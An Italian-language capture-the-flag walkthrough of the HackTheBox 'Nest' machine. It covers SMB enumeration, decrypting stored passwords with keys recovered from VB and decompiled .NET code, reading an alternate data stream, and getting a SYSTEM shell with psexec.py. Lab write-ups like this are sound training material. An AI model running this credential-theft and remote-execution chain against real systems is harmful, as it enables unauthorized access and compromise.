@@ -1,0 +1,582 @@
+10.10.10.178
+
+
+
+sudo masscan -p1-65535 --rate 1000 --banners --open 10.10.10.178 -e tun0
+[sudo] password for kali: 
+Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2021-12-21 09:13:29 GMT
+Initiating SYN Stealth Scan
+Scanning 1 hosts [65535 ports/host]
+Discovered open port 4386/tcp on 10.10.10.178                                  
+Discovered open port 445/tcp on 10.10.10.178
+
+
+
+nmap -sC -sV -Pn -p 4386,445 10.10.10.178
+Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-21 04:15 EST
+Nmap scan report for 10.10.10.178
+Host is up (0.13s latency).
+
+PORT     STATE SERVICE       VERSION
+445/tcp  open  microsoft-ds?
+4386/tcp open  unknown
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
+|     Reporting Service V1.2
+|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest, SIPOptions: 
+|     Reporting Service V1.2
+|     Unrecognised command
+|   Help: 
+|     Reporting Service V1.2
+|     This service allows users to run queries against databases using the legacy HQK format
+|     AVAILABLE COMMANDS ---
+|     LIST
+|     SETDIR <Directory_Name>
+|     RUNQUERY <Query_ID>
+|     DEBUG <Password>
+|_    HELP <Command>
+
+PORTA 4386:
+
+
+HQK Reporting Service V1.2
+
+>
+Unrecognised command
+>
+Session timed out
+
+HQK Reporting Service V1.2          ---> vulnerabile a RCE (?)
+
+
+
+PORT 445 (SMB):
+smbmap -H 10.10.10.178 -u anonymous
+[+] Guest session   	IP: 10.10.10.178:445	Name: 10.10.10.178                                      
+    Disk                                                Permissions	Comment
+	----                                                -----------	-------
+	ADMIN$                                            	NO ACCESS	Remote Admin
+	C$                                                	NO ACCESS	Default share
+	Data                                              	READ ONLY	
+	IPC$                                              	NO ACCESS	Remote IPC
+	Secure$                                           	NO ACCESS	
+	Users                                             	READ ONLY
+
+Controllo prima Data:
+
+smb: \Shared\Maintenance\> dir
+  .                                   D        0  Wed Aug  7 15:07:32 2019
+  ..                                  D        0  Wed Aug  7 15:07:32 2019
+  Maintenance Alerts.txt              A       48  Mon Aug  5 19:01:44 2019
+
+		5242623 blocks of size 4096. 1840274 blocks available
+smb: \Shared\Maintenance\> get "Maintenance Alerts.txt"
+
+
+
+smb: \Shared\Templates\HR\> dir
+  .                                   D        0  Wed Aug  7 15:08:01 2019
+  ..                                  D        0  Wed Aug  7 15:08:01 2019
+  Welcome Email.txt                   A      425  Wed Aug  7 18:55:36 2019
+
+		5242623 blocks of size 4096. 1840274 blocks available
+smb: \Shared\Templates\HR\> get "Welcome Email.txt"
+getting file \Shared\Templates\HR\Welcome Email.txt of size 425 as Welcome Email.txt (0.9 KiloBytes/sec) (average 0.5 KiloBytes/sec)
+
+
+questo template di welcome mail è interessante:
+
+We would like to extend a warm welcome to our newest member of staff, <FIRSTNAME> <SURNAME>
+
+You will find your home folder in the following location: 
+\\HTB-NEST\Users\<USERNAME>
+
+If you have any issues accessing specific services or workstations, please inform the 
+IT department and use the credentials below until all systems have been set up for you.
+
+Username: TempUser
+Password: welcome2019
+
+
+Thank you
+HR
+
+
+provo ad accedere allo share Users con il tempUser
+
+
+smbclient //10.10.10.178/Users -u TempUser -p welcome2019
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                   D        0  Sat Jan 25 18:04:21 2020
+  ..                                  D        0  Sat Jan 25 18:04:21 2020
+  Administrator                       D        0  Fri Aug  9 11:08:23 2019
+  C.Smith                             D        0  Sun Jan 26 02:21:44 2020
+  L.Frost                             D        0  Thu Aug  8 13:03:01 2019
+  R.Thompson                          D        0  Thu Aug  8 13:02:50 2019
+  TempUser                            D        0  Wed Aug  7 18:55:56 2019
+
+
+purtroppo non riesco ad accedere a nessuna di queste directoy, almeno però ho una lista di utenti 
+
+
+riprovo ad accedere a Data visto che alcune cose come anonymous non mi erano accessibili, tra l'altro ora ho accesso anche a secure:
+
+smbmap -H 10.10.10.178 -u TempUser -p welcome2019                                            130 ⨯
+[+] IP: 10.10.10.178:445	Name: 10.10.10.178                                      
+        Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	ADMIN$                                            	NO ACCESS	Remote Admin
+	C$                                                	NO ACCESS	Default share
+	Data                                              	READ ONLY	
+	IPC$                                              	NO ACCESS	Remote IPC
+	Secure$                                           	READ ONLY	
+	Users                                             	READ ONLY
+
+
+
+Provo ad accedere a Secure
+
+smbclient //10.10.10.178/Secure$ -U TempUser 
+
+smb: \> dir
+  .                                   D        0  Wed Aug  7 19:08:12 2019
+  ..                                  D        0  Wed Aug  7 19:08:12 2019
+  Finance                             D        0  Wed Aug  7 15:40:13 2019
+  HR                                  D        0  Wed Aug  7 19:08:11 2019
+  IT                                  D        0  Thu Aug  8 06:59:25 2019
+
+purtroppo comunque non ho i permessi per listare queste directory
+quindi provo ad accedere di nuovo a Data dove prima non potevo listare quasi nulla
+
+
+ci sono molti file xml di configurazione, che scarico con smbmap:
+
+smbmap -u TempUser -p welcome2019 -H 10.10.10.178 -R Data -A xml  
+
+
+[+] Match found! Downloading: Data\IT\Configs\Adobe\editing.xml
+[+] Match found! Downloading: Data\IT\Configs\Adobe\projects.xml
+[+] Match found! Downloading: Data\IT\Configs\Adobe\settings.xml
+[+] Match found! Downloading: Data\IT\Configs\Atlas\Temp.XML
+[+] Match found! Downloading: Data\IT\Configs\Microsoft\Options.xml
+[+] Match found! Downloading: Data\IT\Configs\NotepadPlusPlus\config.xml
+[+] Match found! Downloading: Data\IT\Configs\NotepadPlusPlus\shortcuts.xml
+[+] Match found! Downloading: Data\IT\Configs\RU Scanner\RU_config.xml
+
+
+<File filename="\\HTB-NEST\Secure$\IT\Carl\Temp.txt" />
+        <File filename="C:\Users\C.Smith\Desktop\todo.txt" />
+
+        <Username>c.smith</Username>
+  <Password>fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=</Password>
+
+
+  la password che ho trovato è criptata ma non so come quindi non possos usare hashcat o john (per ora)
+
+però nel filename c'è un path all'interno dello share Secret$
+
+anche se non posso listarlo forse riesco ad accedere comunque alla directory \Secure$\IT\Carl\
+
+provo con smbclient:
+
+smb: \IT\Carl\> dir
+  .                                   D        0  Wed Aug  7 15:42:14 2019
+  ..                                  D        0  Wed Aug  7 15:42:14 2019
+  Docs                                D        0  Wed Aug  7 15:44:00 2019
+  Reports                             D        0  Tue Aug  6 09:45:40 2019
+  VB Projects                         D        0  Tue Aug  6 10:41:55 2019
+
+smb: \IT\Carl\VB Projects\> dir
+  .                                   D        0  Tue Aug  6 10:41:55 2019
+  ..                                  D        0  Tue Aug  6 10:41:55 2019
+  Production                          D        0  Tue Aug  6 10:07:13 2019
+  WIP                                 D        0  Tue Aug  6 10:47:41 2019
+
+smb: \IT\Carl\VB Projects\WIP\RU\> dir
+  .                                   D        0  Fri Aug  9 11:36:45 2019
+  ..                                  D        0  Fri Aug  9 11:36:45 2019
+  RUScanner                           D        0  Wed Aug  7 18:05:54 2019
+  RUScanner.sln                       A      871  Tue Aug  6 10:45:36 2019
+
+smb: \IT\Carl\VB Projects\WIP\RU\RUScanner\> dir
+  .                                   D        0  Wed Aug  7 18:05:54 2019
+  ..                                  D        0  Wed Aug  7 18:05:54 2019
+  bin                                 D        0  Wed Aug  7 16:00:11 2019
+  ConfigFile.vb                       A      772  Wed Aug  7 18:05:09 2019
+  Module1.vb                          A      279  Wed Aug  7 18:05:44 2019
+  My Project                          D        0  Wed Aug  7 16:00:11 2019
+  obj                                 D        0  Wed Aug  7 16:00:11 2019
+  RU Scanner.vbproj                   A     4828  Fri Aug  9 11:37:51 2019
+  RU Scanner.vbproj.user              A      143  Tue Aug  6 08:55:27 2019
+  SsoIntegration.vb                   A      133  Wed Aug  7 18:05:58 2019
+  Utils.vb                            A     4888  Wed Aug  7 15:49:35 2019
+
+
+
+scarico tutto 
+
+in Module1.vb trovo:
+
+Dim test As New SsoIntegration With {.Username = Config.Username, .Password = Utils.DecryptString(Config.Password)}
+
+quindi l'utility per decriptare sta in Utils.vb:
+
+Public Shared Function DecryptString(EncryptedString As String) As String
+        If String.IsNullOrEmpty(EncryptedString) Then
+            Return String.Empty
+        Else
+            Return Decrypt(EncryptedString, "N3st22", "88552299", 2, "464R5DFA5DL6LE28", 256)
+        End If
+    End Function
+
+
+
+eseguendo il codice ottengo la password in chiaro che è:
+
+xRxRxPANCAK3SxRxRx
+
+quindi ora ho unaccount da poter usare:
+
+c.smith:xRxRxPANCAK3SxRxRx
+
+però non posso comunque colegarmi alla macchina per ottenere una shell
+
+quindi ritorno su smb con le nuove credenziali sperando di trovare altro che prima non ho potuto aprire 
+
+
+smbmap -H 10.10.10.178 -u "c.smith" -p "xRxRxPANCAK3SxRxRx"
+[+] IP: 10.10.10.178:445	Name: 10.10.10.178                                      
+        Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	ADMIN$                                            	NO ACCESS	Remote Admin
+	C$                                                	NO ACCESS	Default share
+	Data                                              	READ ONLY	
+	IPC$                                              	NO ACCESS	Remote IPC
+	Secure$                                           	READ ONLY	
+	Users                                             	READ ONLY
+
+
+
+smbmap -H 10.10.10.178 -R Users -u "c.smith" -p "xRxRxPANCAK3SxRxRx"                          1 ⨯
+[+] IP: 10.10.10.178:445	Name: 10.10.10.178                                      
+        Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	Users                                             	READ ONLY	
+	.\Users\*
+	dr--r--r--                0 Sat Jan 25 18:04:21 2020	.
+	dr--r--r--                0 Sat Jan 25 18:04:21 2020	..
+	dr--r--r--                0 Wed Jul 21 14:47:04 2021	Administrator
+	dr--r--r--                0 Wed Jul 21 14:47:04 2021	C.Smith
+	dr--r--r--                0 Thu Aug  8 13:03:29 2019	L.Frost
+	dr--r--r--                0 Thu Aug  8 13:02:56 2019	R.Thompson
+	dr--r--r--                0 Wed Jul 21 14:47:15 2021	TempUser
+	.\Users\C.Smith\*
+	dr--r--r--                0 Wed Jul 21 14:47:04 2021	.
+	dr--r--r--                0 Wed Jul 21 14:47:04 2021	..
+	dr--r--r--                0 Wed Jul 21 14:47:05 2021	HQK Reporting
+	fr--r--r--               34 Tue Dec 21 04:12:46 2021	user.txt
+	.\Users\C.Smith\HQK Reporting\*
+	dr--r--r--                0 Wed Jul 21 14:47:05 2021	.
+	dr--r--r--                0 Wed Jul 21 14:47:05 2021	..
+	dr--r--r--                0 Fri Aug  9 08:18:42 2019	AD Integration Module
+	fr--r--r--                0 Wed Jul 21 14:47:12 2021	Debug Mode Password.txt
+	fr--r--r--              249 Wed Jul 21 14:47:14 2021	HQK_Config_Backup.xml
+	.\Users\C.Smith\HQK Reporting\AD Integration Module\*
+	dr--r--r--                0 Fri Aug  9 08:18:42 2019	.
+	dr--r--r--                0 Fri Aug  9 08:18:42 2019	..
+	fr--r--r--            17408 Wed Aug  7 19:42:49 2019	HqkLdap.exe
+
+
+posso accedere a user.txt:
+
+5562d7c5115445f4e929715ff5df237c
+
+Debug Mode Password.txt sembra essere vuoto però se vedo allinfo del file ci sono due stream:
+
+smb: \C.Smith\HQK Reporting\> allinfo "Debug Mode Password.txt"
+altname: DEBUGM~1.TXT
+create_time:    Thu Aug  8 07:06:12 PM 2019 EDT
+access_time:    Thu Aug  8 07:06:12 PM 2019 EDT
+write_time:     Thu Aug  8 07:08:17 PM 2019 EDT
+change_time:    Wed Jul 21 02:47:12 PM 2021 EDT
+attributes: A (20)
+stream: [::$DATA], 0 bytes
+stream: [:Password:$DATA], 15 bytes
+
+lo scarico con get "Debug Mode Password.txt:Password"
+
+
+WBQ201953D8w 
+
+la conservo, potrebbe essere la pwd di Administrator
+
+provo ad accedere ad smb con questa password
+no, ottengo LOGON FAILURE
+
+
+a questo punto mi concentro sul servizio sulla porta 4386
+
+telnet 10.10.10.178 4386                                                                                           1 ⨯
+Trying 10.10.10.178...
+Connected to 10.10.10.178.
+Escape character is '^]'.
+
+HQK Reporting Service V1.2
+
+>help
+
+This service allows users to run queries against databases using the legacy HQK format
+
+--- AVAILABLE COMMANDS ---
+
+LIST
+SETDIR <Directory_Name>
+RUNQUERY <Query_ID>
+DEBUG <Password>
+HELP <Command>
+
+
+>LIST
+
+Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command
+
+ QUERY FILES IN CURRENT DIRECTORY
+
+[DIR]  COMPARISONS
+[1]   Invoices (Ordered By Customer)
+[2]   Products Sold (Ordered By Customer)
+[3]   Products Sold In Last 30 Days
+
+Current Directory: ALL QUERIES
+>RUNQUERY 1
+
+Invalid database configuration found. Please contact your system administrator
+
+C'È LA POSSIBILITÀ DI USARE IL COMANDO DEBUG <Password>
+
+la password potrebbe eswsere quella che ho trovato prima
+
+>DEBUG WBQ201953D8w
+
+Debug mode enabled. Use the HELP command to view additional commands that are now available
+
+ora ho piu comandi a disposizione:
+
+
+--- AVAILABLE COMMANDS ---
+
+LIST
+SETDIR <Directory_Name>
+RUNQUERY <Query_ID>
+DEBUG <Password>
+HELP <Command>
+SERVICE
+SESSION
+SHOWQUERY <Query_ID>
+
+
+>SERVICE
+
+--- HQK REPORTING SERVER INFO ---
+
+Version: 1.2.0.0
+Server Hostname: HTB-NEST
+Server Process: "C:\Program Files\HQK\HqkSvc.exe"
+Server Running As: Service_HQK
+Initial Query Directory: C:\Program Files\HQK\ALL QUERIES
+
+>session
+
+--- Session Information ---
+
+Session ID: 5d000ece-3cc9-4771-a612-195687bff0ab
+Debug: True
+Started At: 12/21/2021 4:15:23 PM
+Server Endpoint: 10.10.10.178:4386
+Client Endpoint: 10.10.16.5:47658
+Current Query Directory: C:\Program Files\HQK\ALL QUERIES
+
+>showquery 1
+
+TITLE=Invoices (Ordered By Customer)
+QUERY_MODE=VIEW
+QUERY_TYPE=INVOICE
+SORTBY=CUSTOMER
+DATERANGE=ALL
+
+>showquery 2
+
+TITLE=Products Sold (Ordered By Customer)
+QUERY_MODE=VIEW
+QUERY_TYPE=PRODUCT
+SORTBY=CUSTOMER
+DATERANGE=ALL
+
+>showquery 3
+
+TITLE=Products Sold In Last 30 Days
+QUERY_MODE=VIEW
+QUERY_TYPE=PRODUCT
+DATERANGE=LAST30
+
+
+>setdir \users\Administrator\
+
+Error: Access to the path 'C:\users\Administrator\' is denied.
+
+
+>setdir ..
+
+Current directory set to HQK
+>list
+
+Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command
+
+ QUERY FILES IN CURRENT DIRECTORY
+
+[DIR]  ALL QUERIES
+[DIR]  LDAP
+[DIR]  Logs
+[1]   HqkSvc.exe
+[2]   HqkSvc.InstallState
+[3]   HQK_Config.xml
+
+>list
+
+Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command
+
+ QUERY FILES IN CURRENT DIRECTORY
+
+[DIR]  ALL QUERIES
+[DIR]  LDAP
+[DIR]  Logs
+[1]   HqkSvc.exe
+[2]   HqkSvc.InstallState
+[3]   HQK_Config.xml
+
+Current Directory: HQK
+>setdir LDAP
+
+Current directory set to LDAP
+>list
+
+Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command
+
+ QUERY FILES IN CURRENT DIRECTORY
+
+[1]   HqkLdap.exe
+[2]   Ldap.conf
+
+Current Directory: LDAP
+>runquery 2
+
+Invalid database configuration found. Please contact your system administrator
+>showquery 2
+
+Domain=nest.local
+Port=389
+BaseOu=OU=WBQ Users,OU=Production,DC=nest,DC=local
+User=Administrator
+Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=
+
+la password sembra essere hashata/criptata ma non so come
+
+però c'è anche un executable: HqkLdap.exe 
+riesco ad ottenerlo da smbclient
+
+file HqkLdap.exe
+HqkLdap.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows
+
+
+posso usare https://github.com/dnSpy/dnSpy/releases per decompilarlo
+
+
+
+public static string DS(string EncryptedString)
+		{
+			if (string.IsNullOrEmpty(EncryptedString))
+			{
+				return string.Empty;
+			}
+			return CR.RD(EncryptedString, "667912", "1313Rf99", 3, "1L1SA61493DRV53Z", 256);
+		}
+
+
+    private static string RD(string cipherText, string passPhrase, string saltValue, int passwordIterations, string initVector, int keySize)
+		{
+			byte[] bytes = Encoding.ASCII.GetBytes(initVector);
+			byte[] bytes2 = Encoding.ASCII.GetBytes(saltValue);
+			byte[] array = Convert.FromBase64String(cipherText);
+			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passPhrase, bytes2, passwordIterations);
+			checked
+			{
+				byte[] bytes3 = rfc2898DeriveBytes.GetBytes((int)Math.Round((double)keySize / 8.0));
+				ICryptoTransform cryptoTransform = new AesCryptoServiceProvider
+				{
+					Mode = 1
+				}.CreateDecryptor(bytes3, bytes);
+				MemoryStream memoryStream = new MemoryStream(array);
+				CryptoStream cryptoStream = new CryptoStream(memoryStream, cryptoTransform, 0);
+				byte[] array2 = new byte[array.Length + 1];
+				int num = cryptoStream.Read(array2, 0, array2.Length);
+				memoryStream.Close();
+				cryptoStream.Close();
+				return Encoding.ASCII.GetString(array2, 0, num);
+			}
+		}
+
+avendo le funzioni in c# ho scritto un piccolo decyptor e ottengo:
+
+
+mcs Program.cs                                                                                                               1 ⨯
+Program.cs(4,19): warning CS0105: The using directive for `System' appeared previously in this namespace
+Compilation succeeded - 1 warning(s)
+                                                                                                                                     
+┌──(kali㉿kali)-[~/…/htb/oscp_like/nest/decrypt]
+└─$ mono Program.exe
+Hello World!
+XtH4nkS4Pl4y1nGX
+
+
+quindi ora posso accdeere ad smbclient come:
+
+Administrator:XtH4nkS4Pl4y1nGX
+
+
+
+
+smbmap -H 10.10.10.178 -u "Administrator" -p "XtH4nkS4Pl4y1nGX" 
+[+] IP: 10.10.10.178:445	Name: 10.10.10.178                                      
+        Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	ADMIN$                                            	READ, WRITE	Remote Admin
+	C$                                                	READ, WRITE	Default share
+	Data                                              	READ, WRITE	
+	IPC$                                              	NO ACCESS	Remote IPC
+	Secure$                                           	READ, WRITE	
+	Users                                             	READ, WRITE
+
+
+  ora che ho diritti di scrittura su dei share posso finalmente ottenre una shell con psexec.py:
+
+  ┌──(kali㉿kali)-[/usr/share/doc/python3-impacket/examples]
+└─$ python3 psexec.py administrator:XtH4nkS4Pl4y1nGX@10.10.10.178                127 ⨯
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+[*] Requesting shares on 10.10.10.178.....
+[*] Found writable share ADMIN$
+[*] Uploading file mJgkpkcp.exe
+[*] Opening SVCManager on 10.10.10.178.....
+[*] Creating service crgz on 10.10.10.178.....
+[*] Starting service crgz.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32> whoami
+nt authority\system
+
+
+
+1664fbf9debf0fc40ea33ee31b04b733
